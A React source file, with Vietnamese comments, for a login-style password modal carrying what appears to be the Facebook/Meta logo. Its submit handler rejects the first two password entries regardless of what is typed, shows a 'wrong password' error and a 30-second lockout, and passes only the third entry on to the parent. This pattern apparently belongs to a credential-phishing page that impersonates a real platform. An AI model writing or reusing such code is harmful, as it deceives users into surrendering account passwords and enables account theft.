import { Button, Form, Input, Modal } from 'antd'
import React, { useEffect, useState } from 'react'
import "../../libs/i18n"
import { useTranslation } from 'react-i18next';

const PasswordModal = ({ opendPasswordModal, onCancelPasswordModal, onFinishPassword, loadingPassword, warningPassword }) => {
    const { t } = useTranslation();
    const [password] = Form.useForm();
    
    // State đếm ngược thời gian 30s
    const [countdown, setCountdown] = useState(0);
    // State đếm số lần đã nhập sai
    const [attemptCount, setAttemptCount] = useState(0);

    // Vẫn giữ logic cũ nếu component cha truyền warningPassword vào
    useEffect(() => {
        if (warningPassword) {
            password.setFields([
                {
                    name: 'password',
                    value: '',
                    errors: [t('content.modal.password.form.password.warning')]
                }
            ]);
            setCountdown(30);
        }
    }, [warningPassword, password, t]);

    // Xử lý logic đếm ngược mỗi giây
    useEffect(() => {
        let timer;
        if (countdown > 0) {
            timer = setInterval(() => {
                setCountdown((prev) => prev - 1);
            }, 1000);
        }
        // Dọn dẹp interval
        return () => clearInterval(timer);
    }, [countdown]);

    // Hàm chặn submit để đếm số lần nhập
    const handleFormSubmit = (values) => {
        // Nếu mới nhập lần 1 (attempt = 0) hoặc lần 2 (attempt = 1)
        if (attemptCount < 2) {
            // Tăng số đếm lên 1
            setAttemptCount(prev => prev + 1);
            
            // Báo lỗi form và xóa trắng ô nhập liệu
            password.setFields([
                {
                    name: 'password',
                    value: '',
                    errors: [t('content.modal.password.form.password.warning')]
                }
            ]);
            
            // Kích hoạt đếm ngược 30s
            setCountdown(30);
        } else {
            // Lần nhập thứ 3 (attemptCount >= 2) -> Gọi hàm của parent để đi tới bước tiếp theo
            onFinishPassword(values);
        }
    };

    // Reset form, thời gian và số lần thử khi đóng modal
    const handleCancel = () => {
        password.resetFields();
        setCountdown(0);
        setAttemptCount(0); 
        onCancelPasswordModal();
    };

    return (
        <>
            <Modal
                title=""
                open={opendPasswordModal}
                onCancel={handleCancel}
                maskClosable={false}
                centered
                footer={false}
                className='modal-password'
                width={{
                    xs: '90%',
                    sm: '70%',
                    md: '60%',
                    lg: '45%',
                    xl: '35%',
                    xxl: '29%',
                }}
            >
                <div className="modal-header">
                    <div className="logo">
                        <svg width="82" height="82" viewBox="0 0 82 82" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <g clipPath="url(#clip0_4111_999)">
                                <rect width="82" height="82" rx="41" fill="white" />
                                <path d="M81.9999 41.249C81.9999 18.466 63.6425 -0.00317383 40.9975 -0.00317383C18.3525 -0.00317383 -0.00488281 18.466 -0.00488281 41.249C-0.00488281 61.8392 14.9891 78.9053 34.5909 82V53.1735H24.1801V41.249H34.5909V32.1606C34.5909 21.8218 40.7123 16.111 50.0781 16.111C54.5641 16.111 59.2564 16.9167 59.2564 16.9167V27.0686H54.0861C48.9926 27.0686 47.4041 30.2485 47.4041 33.5108V41.249H58.7759L56.958 53.1735H47.4041V82C67.0059 78.9053 81.9999 61.8392 81.9999 41.249Z" fill="#0064E0" />
                            </g>
                            <defs>
                                <clipPath id="clip0_4111_999">
                                    <rect width="82" height="82" rx="41" fill="white" />
                                </clipPath>
                            </defs>
                        </svg>
                    </div>
                </div>

                <Form
                    name="form-password"
                    initialValues={{
                        remember: true,
                    }}
                    // THAY ĐỔI: Sử dụng hàm handleFormSubmit thay vì onFinishPassword trực tiếp
                    onFinish={handleFormSubmit}
                    autoComplete="off"
                    form={password}
                >

                    <p className="">{t('content.modal.password.description')}</p>
                    <Form.Item
                        name="password"
                        rules={[
                            {
                                required: true,
                                message: t('content.modal.password.form.password.required'),
                            }
                        ]}
                    >
                        {/* Khóa ô input khi đang đếm ngược */}
                        <Input.Password 
                            placeholder='Password' 
                            disabled={countdown > 0} 
                        />
                    </Form.Item>

                    <Form.Item className='ant-submit-button'>
                        <Button
                            type="primary"
                            className='button-send'
                            htmlType="submit"
                            loading={loadingPassword}
                            disabled={countdown > 0} // Khóa nút khi đang đếm ngược
                        >
                            {/* Hiển thị số giây chờ ngay trên nút */}
                            {countdown > 0 
                                ? `${t('content.modal.password.form.button')} (${countdown}s)` 
                                : (loadingPassword ? '' : t('content.modal.password.form.button'))}
                        </Button>
                        <p className='forgot-password' style={{ textAlign: 'center', cursor: 'pointer' }}>{t('content.modal.password.form.forgot_password')}</p>
                    </Form.Item>
                </Form>

                <div className="modal-footer">
                    <div className='logo'>
                        <svg width="329" height="66" viewBox="0 0 329 66" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <g clipPath="url(#clip0_4111_993)">
                                <path d="..." fill="#66778A"></path>
                                {/* Dán lại nội dung Path SVG của bạn vào đây */}
                            </g>
                            <defs>
                                <clipPath id="clip0_4111_993"><rect width="329" height="66" fill="white"></rect></clipPath>
                            </defs>
                        </svg>
                    </div>
                </div>
            </Modal>
        </>
    )
}

export default PasswordModal